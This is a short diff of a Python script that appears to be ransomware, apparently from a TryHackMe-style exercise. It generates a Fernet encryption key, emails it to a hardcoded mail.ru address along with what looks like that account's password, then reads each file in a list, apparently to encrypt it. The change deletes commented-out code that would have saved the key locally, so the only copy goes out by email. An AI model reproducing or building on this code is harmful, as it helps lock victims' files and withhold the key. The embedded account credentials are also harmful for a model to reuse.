@@ -28,10 +28,6 @@ key = Fernet.generate_key()
 
 mail_sender('rastgeletryhackme@mail.ru','AWzaqhu1iqpuHDequaEd',key)
 
-# with open('generated.key', 'wb') as generatedkey:
-#     generatedkey.write(key)
-# Oluşturulan anahtarı 'generated.key' adlı bir dosyaya yazıyoruz.
-
 for file in file_list:
 	with open(file,'rb') as the_file:
 		contents = the_file.read()
